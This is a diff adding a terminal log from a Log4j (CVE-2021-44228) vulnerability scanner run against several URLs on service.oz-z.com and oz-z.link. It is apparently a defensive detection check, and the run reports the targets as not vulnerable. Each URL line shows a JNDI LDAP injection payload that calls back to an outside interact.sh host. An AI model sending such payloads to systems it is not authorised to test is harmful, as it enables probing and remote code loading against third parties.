@@ -1,0 +1,24 @@
+$ ./scan.sh 
+[•] CVE-2021-44228 - Apache Log4j RCE Scanner
+[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
+[•] Secure your External Attack Surface with FullHunt.io.
+[•] Initiating DNS callback server (interact.sh).
+[%] Checking for Log4j RCE CVE-2021-44228.
+[•] URL: https://service.oz-z.com
+[•] URL: https://service.oz-z.com | PAYLOAD: ${jndi:ldap://service.oz-z.com.931nrrg4wp97441drev6t2h280enhv27q.interact.sh/9vblj4d}
+[•] URL: https://service.oz-z.com/support/help
+[•] URL: https://service.oz-z.com/support/help | PAYLOAD: ${jndi:ldap://service.oz-z.com.931nrrg4wp97441drev6t2h280enhv27q.interact.sh/lhxv29d}
+[•] URL: https://service.oz-z.com/distribution
+[•] URL: https://service.oz-z.com/distribution | PAYLOAD: ${jndi:ldap://service.oz-z.com.931nrrg4wp97441drev6t2h280enhv27q.interact.sh/hszpblx}
+[•] URL: https://service.oz-z.com/marketing
+[•] URL: https://service.oz-z.com/marketing | PAYLOAD: ${jndi:ldap://service.oz-z.com.931nrrg4wp97441drev6t2h280enhv27q.interact.sh/nwwacth}
+[•] URL: https://service.oz-z.com/upstream
+[•] URL: https://service.oz-z.com/upstream | PAYLOAD: ${jndi:ldap://service.oz-z.com.931nrrg4wp97441drev6t2h280enhv27q.interact.sh/8t6uzdm}
+[•] URL: https://service.oz-z.com/global/privacyPolicy
+[•] URL: https://service.oz-z.com/global/privacyPolicy | PAYLOAD: ${jndi:ldap://service.oz-z.com.931nrrg4wp97441drev6t2h280enhv27q.interact.sh/mi99r9l}
+[•] URL: https://oz-z.link/sDIVz6x
+[•] URL: https://oz-z.link/sDIVz6x | PAYLOAD: ${jndi:ldap://oz-z.link.931nrrg4wp97441drev6t2h280enhv27q.interact.sh/e51k4jk}
+[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.
+[•] Waiting...
+[•] Targets does not seem to be vulnerable.
+
